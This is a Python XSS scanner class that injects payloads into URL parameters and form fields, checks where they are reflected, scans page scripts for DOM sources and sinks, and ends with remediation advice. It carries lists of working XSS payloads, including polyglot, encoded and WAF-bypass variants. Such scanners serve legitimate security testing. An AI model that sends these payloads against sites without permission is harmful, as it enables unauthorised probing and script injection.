"""
XSS (Cross-Site Scripting) Scanner Service
Detects reflected, stored, and DOM-based XSS vulnerabilities
"""

import re
import html
import random
import string
import hashlib
import concurrent.futures
from typing import List, Dict, Optional, Callable, Any, Set, Tuple
from datetime import datetime
from urllib.parse import urlparse, urlencode, parse_qs, urljoin, quote
import threading
import requests
from bs4 import BeautifulSoup

from app.services.utils import (
    normalize_url,
    make_request,
    generate_scan_id,
    load_wordlist,
    get_base_url,
    extract_params,
    build_url_with_params
)


class XSSScanner:
    """
    XSS Vulnerability Scanner
    
    Features:
    - Reflected XSS detection
    - Stored XSS detection (basic)
    - DOM-based XSS detection
    - Multiple payload types
    - Context-aware payloads
    - Encoding bypass techniques
    - Form and URL parameter testing
    - WAF bypass attempts
    - Custom payload support
    """
    
    # Unique identifier for tracking reflections
    CANARY_PREFIX = "xSs"
    CANARY_SUFFIX = "TeSt"
    
    # Basic XSS Payloads
    BASIC_PAYLOADS = [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '<body onload=alert(1)>',
        '"><script>alert(1)</script>',
        "'><script>alert(1)</script>",
        '<img src="x" onerror="alert(1)">',
        '<svg/onload=alert(1)>',
        '"><img src=x onerror=alert(1)>',
        "'-alert(1)-'",
        '"-alert(1)-"',
        '<script>alert(String.fromCharCode(88,83,83))</script>',
        '<img/src=x onerror=alert(1)>',
        '<iframe src="javascript:alert(1)">',
        '<input onfocus=alert(1) autofocus>',
        '<marquee onstart=alert(1)>',
        '<details open ontoggle=alert(1)>',
        '<audio src=x onerror=alert(1)>',
        '<video src=x onerror=alert(1)>',
        '<object data="javascript:alert(1)">',
    ]
    
    # Polyglot Payloads (work in multiple contexts)
    POLYGLOT_PAYLOADS = [
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
        "'\"-->]]>*/</script></style></title></textarea></noscript></template></select></option><svg onload=alert()>",
        "'\"><img src=x onerror=alert(1)>",
        "javascript:alert(1)//",
        "'-alert(1)-'",
        "\"-alert(1)-\"",
    ]
    
    # Event Handler Payloads
    EVENT_HANDLERS = [
        'onload', 'onerror', 'onclick', 'onmouseover', 'onfocus', 'onblur',
        'onchange', 'onsubmit', 'onreset', 'onselect', 'oninput', 'onkeydown',
        'onkeypress', 'onkeyup', 'ondblclick', 'onmousedown', 'onmouseup',
        'onmousemove', 'onmouseout', 'onmouseenter', 'onmouseleave', 'onwheel',
        'ondrag', 'ondragstart', 'ondragend', 'ondragover', 'ondragenter',
        'ondragleave', 'ondrop', 'onscroll', 'oncopy', 'oncut', 'onpaste',
        'oncontextmenu', 'ontoggle', 'onstart', 'onfinish', 'onbounce'
    ]
    
    # Encoding Bypass Payloads
    ENCODED_PAYLOADS = [
        # URL encoding
        '%3Cscript%3Ealert(1)%3C/script%3E',
        '%3Cimg%20src=x%20onerror=alert(1)%3E',
        # Double URL encoding
        '%253Cscript%253Ealert(1)%253C/script%253E',
        # HTML entity encoding
        '&#60;script&#62;alert(1)&#60;/script&#62;',
        '&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;',
        # Unicode encoding
        '<script>alert\u0028\u0031\u0029</script>',
        # Null byte injection
        '<scr%00ipt>alert(1)</scr%00ipt>',
        # Case variation
        '<ScRiPt>alert(1)</ScRiPt>',
        '<IMG SRC=x OnErRoR=alert(1)>',
    ]
    
    # WAF Bypass Payloads
    WAF_BYPASS_PAYLOADS = [
        '<svg/onload=alert(1)>',
        '<svg onload=alert`1`>',
        '<img src=x onerror=alert`1`>',
        '<<script>alert(1)//<</script>',
        '<script x>alert(1)</script>',
        '<script>\\u0061lert(1)</script>',
        '<img src=1 onerror=\\u0061lert(1)>',
        '<svg onload=&#97;&#108;&#101;&#114;&#116;(1)>',
        '<script>eval(atob("YWxlcnQoMSk="))</script>',
        '<img src=x onerror="eval(atob(\'YWxlcnQoMSk=\'))">',
        '</script><script>alert(1)</script>',
        '<scr<script>ipt>alert(1)</scr</script>ipt>',
        '<img """><script>alert(1)</script>">',
        '<a href="javascript&colon;alert(1)">click</a>',
        '<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">click</a>',
    ]
    
    # DOM XSS Sources and Sinks
    DOM_SOURCES = [
        'document.URL', 'document.documentURI', 'document.baseURI',
        'location', 'location.href', 'location.search', 'location.hash',
        'location.pathname', 'document.cookie', 'document.referrer',
        'window.name', 'history.pushState', 'history.replaceState',
        'localStorage', 'sessionStorage'
    ]
    
    DOM_SINKS = [
        'eval', 'setTimeout', 'setInterval', 'Function',
        'document.write', 'document.writeln',
        'element.innerHTML', 'element.outerHTML', 'element.insertAdjacentHTML',
        'element.onevent', 'location', 'location.href', 'location.assign',
        'location.replace', 'window.open', 'document.domain',
        'postMessage', 'setAttribute', 'jQuery.html', '$.html'
    ]
    
    def __init__(
        self,
        target_url: str,
        timeout: float = 10.0,
        max_threads: int = 10,
        user_agent: Optional[str] = None,
        cookies: Optional[Dict[str, str]] = None,
        headers: Optional[Dict[str, str]] = None,
        proxy: Optional[str] = None
    ):
        """
        Initialize XSS Scanner
        
        Args:
            target_url: Target URL to scan
            timeout: Request timeout in seconds
            max_threads: Maximum concurrent threads
            user_agent: Custom User-Agent header
            cookies: Cookies to include in requests
            headers: Custom headers to include
            proxy: Proxy server URL
        """
        self.target_url = normalize_url(target_url)
        self.base_url = get_base_url(self.target_url)
        self.timeout = timeout
        self.max_threads = max_threads
        self.scan_id = generate_scan_id()
        
        # Session configuration
        self.session = requests.Session()
        self.session.verify = False
        
        # Set headers
        self.headers = {
            'User-Agent': user_agent or 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
        }
        if headers:
            self.headers.update(headers)
        
        self.session.headers.update(self.headers)
        
        # Set cookies
        if cookies:
            self.session.cookies.update(cookies)
        
        # Set proxy
        if proxy:
            self.session.proxies = {
                'http': proxy,
                'https': proxy
            }
        
        # Scan state
        self.vulnerabilities: List[Dict] = []
        self.tested_payloads: Set[str] = set()
        self.is_scanning = False
        self.stop_scan = False
        self._lock = threading.Lock()
        
        # Generate unique canary for this scan
        self.canary = self._generate_canary()
    
    def _generate_canary(self) -> str:
        """Generate unique canary string for tracking reflections"""
        random_part = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        return f"{self.CANARY_PREFIX}{random_part}{self.CANARY_SUFFIX}"
    
    def _generate_payload_with_canary(self, payload: str) -> str:
        """Add canary to payload for tracking"""
        return payload.replace('alert(1)', f'alert("{self.canary}")').replace('alert`1`', f'alert`{self.canary}`')
    
    def _check_reflection(self, response_text: str, payload: str) -> Tuple[bool, str]:
        """
        Check if payload is reflected in response
        
        Returns:
            Tuple[bool, str]: (is_reflected, context)
        """
        # Check for exact reflection
        if payload in response_text:
            context = self._determine_context(response_text, payload)
            return True, context
        
        # Check for HTML-decoded reflection
        decoded_payload = html.unescape(payload)
        if decoded_payload != payload and decoded_payload in response_text:
            return True, 'html_decoded'
        
        # Check for partially reflected payload
        # Check if key XSS characters are present
        key_parts = ['<script', 'onerror', 'onload', 'javascript:', '<svg', '<img']
        for part in key_parts:
            if part.lower() in payload.lower() and part.lower() in response_text.lower():
                return True, 'partial'
        
        return False, 'none'
    
    def _determine_context(self, response_text: str, payload: str) -> str:
        """Determine the context where payload is reflected"""
        try:
            # Find position of payload
            pos = response_text.find(payload)
            if pos == -1:
                return 'unknown'
            
            # Get surrounding context (500 chars before and after)
            start = max(0, pos - 500)
            end = min(len(response_text), pos + len(payload) + 500)
            context_text = response_text[start:end]
            
            # Check various contexts
            # Inside HTML tag attribute
            if re.search(r'<[^>]*' + re.escape(payload) + r'[^>]*>', context_text):
                return 'attribute'
            
            # Inside script tag
            if re.search(r'<script[^>]*>.*' + re.escape(payload) + r'.*</script>', context_text, re.IGNORECASE | re.DOTALL):
                return 'script'
            
            # Inside HTML comment
            if re.search(r'<!--.*' + re.escape(payload) + r'.*-->', context_text, re.DOTALL):
                return 'comment'
            
            # Inside style tag
            if re.search(r'<style[^>]*>.*' + re.escape(payload) + r'.*</style>', context_text, re.IGNORECASE | re.DOTALL):
                return 'style'
            
            # Inside textarea or similar
            if re.search(r'<(textarea|title|noscript)[^>]*>.*' + re.escape(payload), context_text, re.IGNORECASE | re.DOTALL):
                return 'special_tag'
            
            # Default: HTML body
            return 'html_body'
            
        except Exception:
            return 'unknown'
    
    def _check_xss_execution(self, response_text: str, payload: str) -> bool:
        """
        Check if XSS payload would likely execute
        
        This checks if the payload is reflected without proper encoding
        """
        # Check for unencoded dangerous characters
        dangerous_patterns = [
            r'<script[^>]*>',
            r'on\w+\s*=',
            r'javascript:',
            r'<svg[^>]*>',
            r'<img[^>]*onerror',
            r'<iframe[^>]*>',
            r'<object[^>]*>',
            r'<embed[^>]*>',
            r'<body[^>]*onload',
        ]
        
        for pattern in dangerous_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                # Check if our payload matches
                if re.search(pattern, payload, re.IGNORECASE):
                    return True
        
        return False
    
    def test_parameter(
        self,
        url: str,
        param_name: str,
        param_value: str,
        method: str = 'GET',
        payload: str = None
    ) -> Optional[Dict[str, Any]]:
        """
        Test a single parameter for XSS
        
        Args:
            url: Target URL
            param_name: Parameter name to test
            param_value: Original parameter value
            method: HTTP method (GET/POST)
            payload: XSS payload to test
            
        Returns:
            Dict with vulnerability info if found
        """
        if self.stop_scan:
            return None
        
        if payload is None:
            payload = '<script>alert(1)</script>'
        
        try:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            # Inject payload into parameter
            test_value = payload
            
            if method.upper() == 'GET':
                # Build URL with injected parameter
                new_params = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
                new_params[param_name] = test_value
                
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                if new_params:
                    test_url += '?' + urlencode(new_params)
                
                response = self.session.get(test_url, timeout=self.timeout)
            else:
                # POST request
                post_data = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
                post_data[param_name] = test_value
                
                response = self.session.post(url, data=post_data, timeout=self.timeout)
            
            # Check for reflection
            is_reflected, context = self._check_reflection(response.text, payload)
            
            if is_reflected:
                # Check if it would execute
                would_execute = self._check_xss_execution(response.text, payload)
                
                # Determine severity
                if would_execute:
                    severity = 'high'
                    confidence = 'high'
                elif context in ['script', 'attribute']:
                    severity = 'high'
                    confidence = 'medium'
                else:
                    severity = 'medium'
                    confidence = 'low'
                
                return {
                    'vulnerable': True,
                    'type': 'Reflected XSS',
                    'url': url,
                    'method': method,
                    'parameter': param_name,
                    'payload': payload,
                    'context': context,
                    'would_execute': would_execute,
                    'severity': severity,
                    'confidence': confidence,
                    'evidence': self._extract_evidence(response.text, payload),
                    'response_code': response.status_code
                }
        
        except requests.exceptions.RequestException as e:
            pass
        except Exception as e:
            pass
        
        return None
    
    def _extract_evidence(self, response_text: str, payload: str, context_size: int = 100) -> str:
        """Extract evidence of reflection from response"""
        try:
            pos = response_text.find(payload)
            if pos == -1:
                # Try case-insensitive search
                pos = response_text.lower().find(payload.lower())
            
            if pos != -1:
                start = max(0, pos - context_size)
                end = min(len(response_text), pos + len(payload) + context_size)
                evidence = response_text[start:end]
                return f"...{evidence}..."
        except Exception:
            pass
        
        return "Payload reflected in response"
    
    def find_injection_points(self, url: str) -> Dict[str, Any]:
        """
        Find potential XSS injection points in URL and forms
        
        Returns:
            Dict containing URL parameters and form inputs
        """
        injection_points = {
            'url_params': [],
            'forms': [],
            'total_points': 0
        }
        
        try:
            # Get URL parameters
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            for param_name, param_values in params.items():
                injection_points['url_params'].append({
                    'name': param_name,
                    'value': param_values[0] if param_values else '',
                    'method': 'GET'
                })
            
            # Get page and find forms
            response = self.session.get(url, timeout=self.timeout)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            forms = soup.find_all('form')
            for form in forms:
                form_data = {
                    'action': form.get('action', ''),
                    'method': form.get('method', 'GET').upper(),
                    'inputs': []
                }
                
                # Get all input fields
                for input_tag in form.find_all(['input', 'textarea', 'select']):
                    input_name = input_tag.get('name')
                    if input_name:
                        input_type = input_tag.get('type', 'text')
                        input_value = input_tag.get('value', '')
                        
                        # Skip certain input types
                        if input_type.lower() not in ['submit', 'button', 'image', 'reset', 'hidden']:
                            form_data['inputs'].append({
                                'name': input_name,
                                'type': input_type,
                                'value': input_value
                            })
                
                if form_data['inputs']:
                    injection_points['forms'].append(form_data)
            
            injection_points['total_points'] = (
                len(injection_points['url_params']) +
                sum(len(f['inputs']) for f in injection_points['forms'])
            )
        
        except Exception as e:
            injection_points['error'] = str(e)
        
        return injection_points
    
    def scan(
        self,
        crawl: bool = False,
        depth: int = 2,
        payloads: Optional[List[str]] = None,
        test_forms: bool = True,
        callback: Optional[Callable] = None
    ) -> Dict[str, Any]:
        """
        Perform XSS scan
        
        Args:
            crawl: Crawl website for additional URLs
            depth: Crawl depth
            payloads: Custom payloads to use
            test_forms: Test form inputs
            callback: Progress callback(payload, vulnerable, details)
            
        Returns:
            Dict with scan results
        """
        start_time = datetime.now()
        self.is_scanning = True
        self.stop_scan = False
        self.vulnerabilities = []
        
        # Prepare payloads
        if payloads:
            all_payloads = payloads
        else:
            all_payloads = (
                self.BASIC_PAYLOADS +
                self.POLYGLOT_PAYLOADS +
                self.WAF_BYPASS_PAYLOADS[:5]  # Limit WAF bypass payloads
            )
        
        urls_to_test = [self.target_url]
        
        # Crawl for additional URLs if requested
        if crawl:
            from app.services.crawler import WebCrawler
            crawler = WebCrawler(self.target_url, max_depth=depth)
            crawl_results = crawler.crawl()
            urls_to_test.extend(crawl_results.get('urls', []))
            urls_to_test = list(set(urls_to_test))[:50]  # Limit URLs
        
        total_tests = 0
        vulnerable_params = []
        tested_combinations = set()
        
        for url in urls_to_test:
            if self.stop_scan:
                break
            
            # Find injection points
            injection_points = self.find_injection_points(url)
            
            # Test URL parameters
            for param in injection_points['url_params']:
                if self.stop_scan:
                    break
                
                for payload in all_payloads:
                    if self.stop_scan:
                        break
                    
                    # Create unique test identifier
                    test_id = f"{url}:{param['name']}:{hash(payload)}"
                    if test_id in tested_combinations:
                        continue
                    tested_combinations.add(test_id)
                    
                    total_tests += 1
                    
                    result = self.test_parameter(
                        url=url,
                        param_name=param['name'],
                        param_value=param['value'],
                        method='GET',
                        payload=payload
                    )
                    
                    if result and result.get('vulnerable'):
                        with self._lock:
                            self.vulnerabilities.append(result)
                            vulnerable_params.append(result)
                        
                        if callback:
                            try:
                                callback(payload, True, result)
                            except Exception:
                                pass
                        
                        # Skip remaining payloads for this parameter
                        break
                    else:
                        if callback:
                            try:
                                callback(payload, False, {'parameter': param['name']})
                            except Exception:
                                pass
            
            # Test forms
            if test_forms:
                for form in injection_points['forms']:
                    if self.stop_scan:
                        break
                    
                    form_action = form['action']
                    if form_action:
                        if not form_action.startswith('http'):
                            form_action = urljoin(url, form_action)
                    else:
                        form_action = url
                    
                    for input_field in form['inputs']:
                        if self.stop_scan:
                            break
                        
                        for payload in all_payloads[:10]:  # Limit payloads for forms
                            if self.stop_scan:
                                break
                            
                            test_id = f"{form_action}:{input_field['name']}:{hash(payload)}"
                            if test_id in tested_combinations:
                                continue
                            tested_combinations.add(test_id)
                            
                            total_tests += 1
                            
                            result = self.test_parameter(
                                url=form_action,
                                param_name=input_field['name'],
                                param_value=input_field['value'],
                                method=form['method'],
                                payload=payload
                            )
                            
                            if result and result.get('vulnerable'):
                                result['form_action'] = form_action
                                with self._lock:
                                    self.vulnerabilities.append(result)
                                    vulnerable_params.append(result)
                                
                                if callback:
                                    try:
                                        callback(payload, True, result)
                                    except Exception:
                                        pass
                                
                                break
        
        # Check for DOM XSS
        dom_xss_results = self.check_dom_xss(self.target_url)
        
        end_time = datetime.now()
        self.is_scanning = False
        
        # Calculate risk score
        risk_score = self._calculate_risk_score()
        
        return {
            'success': True,
            'scan_id': self.scan_id,
            'target_url': self.target_url,
            'vulnerabilities': self.vulnerabilities,
            'total_found': len(self.vulnerabilities),
            'total_tests': total_tests,
            'urls_tested': len(urls_to_test),
            'dom_xss': dom_xss_results,
            'risk_score': risk_score,
            'severity_summary': self._get_severity_summary(),
            'start_time': start_time.isoformat(),
            'end_time': end_time.isoformat(),
            'duration': (end_time - start_time).total_seconds(),
            'timestamp': datetime.now().isoformat()
        }
    
    def check_dom_xss(self, url: str) -> Dict[str, Any]:
        """
        Check for potential DOM-based XSS vulnerabilities
        
        This performs static analysis of JavaScript code
        """
        result = {
            'potential_vulnerabilities': [],
            'sources_found': [],
            'sinks_found': [],
            'risk_level': 'low'
        }
        
        try:
            response = self.session.get(url, timeout=self.timeout)
            
            # Extract JavaScript code
            soup = BeautifulSoup(response.text, 'html.parser')
            scripts = soup.find_all('script')
            
            js_code = response.text  # Include inline JS
            for script in scripts:
                if script.string:
                    js_code += script.string
            
            # Check for DOM sources
            for source in self.DOM_SOURCES:
                if source in js_code:
                    result['sources_found'].append(source)
            
            # Check for DOM sinks
            for sink in self.DOM_SINKS:
                if sink in js_code:
                    result['sinks_found'].append(sink)
            
            # Check for dangerous patterns
            dangerous_patterns = [
                (r'document\.write\s*\([^)]*location', 'document.write with location'),
                (r'innerHTML\s*=\s*[^;]*location', 'innerHTML with location'),
                (r'eval\s*\([^)]*location', 'eval with location'),
                (r'document\.write\s*\([^)]*document\.URL', 'document.write with document.URL'),
                (r'innerHTML\s*=\s*[^;]*document\.referrer', 'innerHTML with referrer'),
                (r'location\s*=\s*[^;]*\+', 'location assignment with concatenation'),
                (r'window\.open\s*\([^)]*location', 'window.open with location'),
            ]
            
            for pattern, description in dangerous_patterns:
                if re.search(pattern, js_code, re.IGNORECASE):
                    result['potential_vulnerabilities'].append({
                        'type': 'DOM XSS',
                        'pattern': description,
                        'severity': 'medium',
                        'confidence': 'low'
                    })
            
            # Determine risk level
            if result['potential_vulnerabilities']:
                result['risk_level'] = 'high'
            elif result['sources_found'] and result['sinks_found']:
                result['risk_level'] = 'medium'
            
        except Exception as e:
            result['error'] = str(e)
        
        return result
    
    def _calculate_risk_score(self) -> int:
        """Calculate overall XSS risk score (0-100)"""
        if not self.vulnerabilities:
            return 0
        
        score = 0
        
        for vuln in self.vulnerabilities:
            severity = vuln.get('severity', 'low')
            confidence = vuln.get('confidence', 'low')
            
            # Base score by severity
            if severity == 'critical':
                base = 40
            elif severity == 'high':
                base = 30
            elif severity == 'medium':
                base = 20
            else:
                base = 10
            
            # Adjust by confidence
            if confidence == 'high':
                multiplier = 1.0
            elif confidence == 'medium':
                multiplier = 0.7
            else:
                multiplier = 0.4
            
            score += base * multiplier
        
        return min(100, int(score))
    
    def _get_severity_summary(self) -> Dict[str, int]:
        """Get summary of vulnerabilities by severity"""
        summary = {'critical': 0, 'high': 0, 'medium': 0, 'low': 0, 'info': 0}
        
        for vuln in self.vulnerabilities:
            severity = vuln.get('severity', 'low').lower()
            if severity in summary:
                summary[severity] += 1
        
        return summary
    
    def stop(self) -> None:
        """Stop ongoing scan"""
        self.stop_scan = True
    
    def get_vulnerabilities(self) -> List[Dict]:
        """Get list of found vulnerabilities"""
        with self._lock:
            return list(self.vulnerabilities)
    
    def quick_scan(self, callback: Optional[Callable] = None) -> Dict[str, Any]:
        """Perform quick XSS scan with minimal payloads"""
        quick_payloads = [
            '<script>alert(1)</script>',
            '"><script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
        ]
        
        return self.scan(
            crawl=False,
            payloads=quick_payloads,
            test_forms=False,
            callback=callback
        )
    
    def generate_report(self) -> Dict[str, Any]:
        """Generate detailed XSS scan report"""
        return {
            'scan_id': self.scan_id,
            'target': self.target_url,
            'timestamp': datetime.now().isoformat(),
            'summary': {
                'total_vulnerabilities': len(self.vulnerabilities),
                'severity_breakdown': self._get_severity_summary(),
                'risk_score': self._calculate_risk_score()
            },
            'vulnerabilities': self.vulnerabilities,
            'recommendations': self._generate_recommendations()
        }
    
    def _generate_recommendations(self) -> List[str]:
        """Generate security recommendations"""
        recommendations = []
        
        if self.vulnerabilities:
            recommendations.append("Implement proper output encoding for all user-supplied data")
            recommendations.append("Use Content-Security-Policy (CSP) headers to mitigate XSS")
            recommendations.append("Validate and sanitize all user input on the server side")
            recommendations.append("Use HTTPOnly and Secure flags for cookies")
            recommendations.append("Consider using a Web Application Firewall (WAF)")
            
            # Context-specific recommendations
            contexts = set(v.get('context', '') for v in self.vulnerabilities)
            
            if 'attribute' in contexts:
                recommendations.append("Properly encode data placed in HTML attributes")
            
            if 'script' in contexts:
                recommendations.append("Avoid placing untrusted data directly in JavaScript code")
            
            if 'html_body' in contexts:
                recommendations.append("Use HTML entity encoding for data in HTML context")
        
        return recommendations